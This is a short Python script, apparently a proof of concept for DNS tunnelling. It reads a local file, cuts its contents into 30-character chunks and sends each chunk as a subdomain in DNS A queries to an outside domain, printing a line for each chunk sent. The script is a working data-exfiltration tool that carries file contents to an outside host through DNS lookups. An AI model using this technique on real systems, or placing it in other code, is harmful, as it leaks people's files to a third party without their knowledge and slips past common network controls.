import dns.resolver
from time import sleep
from core import file2string, string2msg


DOMAIN = '.msg.moofeng.cn'
def query(msg):
    try:
        dns.resolver.query(msg + DOMAIN, 'A')
    except dns.resolver.NoAnswer:
        pass

string = file2string('test.txt')
msg = string2msg(string, n=30)
for _ in msg:
    print(f"[+] Sending: {_}")
    query(_)